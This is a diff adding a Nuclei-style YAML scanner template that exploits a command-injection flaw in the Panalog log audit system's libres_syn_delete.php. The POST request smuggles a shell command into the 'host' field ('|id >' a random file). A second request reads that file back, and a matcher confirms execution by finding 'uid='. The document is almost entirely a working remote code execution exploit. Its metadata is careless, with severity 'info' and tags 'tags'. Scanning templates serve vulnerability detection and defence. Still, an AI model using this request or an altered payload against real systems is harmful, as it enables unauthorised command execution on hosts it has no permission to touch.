@@ -1,0 +1,39 @@
+id: Panalog-libres-rce
+info:
+  name: Panalog-libres-rce
+  author: apple
+  severity: info
+  description: Panalog大数据日志审计系统libres_syn_delete.php存在命令执行
+  reference:
+    - https://github.com/wy876/POC/blob/main/Panalog%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Flibres_syn_delete.php%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
+  tags: tags
+  
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+http:
+  - raw:
+      - |-
+        POST /content-apply/libres_syn_delete.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Content-Length: 54
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        token=1&id=2&host=|id >{{file_name}}
+      - |-
+        GET /content-apply/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Content-Length: 54
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        part: body
+        words:
+          - uid=
